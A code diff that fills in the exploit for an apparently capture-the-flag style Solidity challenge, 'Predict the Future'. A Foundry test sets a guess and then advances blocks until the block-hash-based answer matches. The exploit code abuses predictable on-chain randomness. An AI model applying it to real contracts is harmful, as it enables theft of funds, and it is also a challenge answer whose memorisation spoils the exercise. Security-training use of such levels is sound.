@@ -16,7 +16,28 @@ contract PredictTheFutureTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint8 myGuess = 7;
+        instance.setGuess{value: 0.01 ether}(myGuess);
+
+        uint256 nextBlockNumber = block.number + 1;
+
+        while (true) {
+            vm.roll(block.number + 1);
+            vm.warp(block.timestamp + 15);
+
+            if (block.number <= nextBlockNumber) {
+                continue;
+            }
+
+            bytes32 prevBlockHash = blockhash(block.number - 1);
+
+            uint256 answer = uint256(keccak256(abi.encodePacked(prevBlockHash, block.timestamp))) % 10;
+
+            if (answer == myGuess) {
+                instance.solution();
+                break;
+            }
+        }
 
         checkSuccess();
     }
